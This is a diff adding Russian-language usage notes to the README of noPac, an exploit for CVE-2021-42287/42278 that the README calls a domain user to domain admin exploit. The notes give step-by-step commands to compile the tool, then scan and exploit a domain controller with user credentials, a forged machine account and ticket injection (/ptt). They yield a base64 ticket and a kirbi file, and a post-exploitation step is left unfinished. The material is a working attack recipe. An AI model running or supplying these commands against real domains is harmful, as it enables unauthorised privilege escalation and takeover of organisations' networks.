@@ -1,3 +1,16 @@
+```
+1. Выше скомпилил екзешник из оригинальных исходников автора експа 
+2. Скан
+.\noPac.exe scan -domain domain.local -user user -pass Password!@#
+3. Експлойт
+.\noPac.exe -domain domain.local -user user -pass Password!@# /dc DC01 /mAccount pdc /mPassword Qwerty123 /service cifs /ptt
+
+-> на выходе получаем строку в бейс64 и файлик кирби
+
+4. Пост эксплуатация
+.dopolnyu
+```
+
 # noPac
 
 CVE-2021-42287/CVE-2021-42278 Scanner & Exploiter. Yet another low effort domain user to domain admin exploit.
